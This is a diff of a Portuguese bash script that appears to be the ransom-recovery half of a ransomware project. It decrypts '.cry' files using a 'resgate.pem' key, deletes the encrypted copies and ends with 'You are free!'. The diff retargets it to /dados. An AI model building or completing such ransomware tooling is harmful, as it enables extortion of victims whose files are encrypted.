@@ -2,6 +2,7 @@
 #################################
 # Autor: Rafael Vergani 	#
 # https://github.com/vergani 	#
+# Data: 29/09/2023		#
 #################################
 
 if [[ -f resgate.pem && -f chave.enc ]];
@@ -14,7 +15,7 @@ else
 fi
 
 
-volume_alvo=/home/vergani/arquivos
+volume_alvo=/dados
 arquivos=$(find $volume_alvo -print | egrep ".cry")
 
 echo "[+] Desfazendo criptografia."
@@ -30,4 +31,4 @@ do
 	rm $file
 done
 
-echo "[+] Restauração concluída."
+echo "[+] Restauração concluída. Você está livre!"
